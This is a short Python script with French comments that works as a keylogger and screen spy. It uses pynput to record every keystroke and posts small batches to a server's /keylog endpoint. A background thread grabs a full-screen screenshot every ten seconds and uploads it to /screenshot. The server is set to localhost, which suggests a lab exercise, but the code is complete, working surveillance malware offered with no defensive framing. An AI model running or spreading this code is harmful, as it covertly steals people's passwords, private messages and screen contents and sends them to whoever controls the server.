import time
import threading
import requests
from pynput import keyboard
from PIL import ImageGrab


SERVER_URL = "http://localhost:5000"  
SCREENSHOT_INTERVAL = 10  
KEYSTROKES_INTERVAL = 10  

keystrokes = ""

def on_press(key):
    global keystrokes
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes += key.char
        else:
            keystrokes += f" [{key}] "
        
        if len(keystrokes) >= KEYSTROKES_INTERVAL:
            requests.post(f"{SERVER_URL}/keylog", json={"keystrokes": keystrokes})
            
            keystrokes = ""  
    except Exception as e:
        print(f"Erreur : {e}")


def take_screenshot():
    """Prend des captures d'écran à intervalles réguliers."""
    while True:
        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        screenshot.save("temp_screenshot.png")

        with open("temp_screenshot.png", "rb") as img:
            requests.post(f"{SERVER_URL}/screenshot", files={"screenshot": img}, data={"timestamp": timestamp})
            
        time.sleep(SCREENSHOT_INTERVAL)

key_listener = keyboard.Listener(on_press=on_press)
key_listener.start()


screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
screenshot_thread.start()


key_listener.join()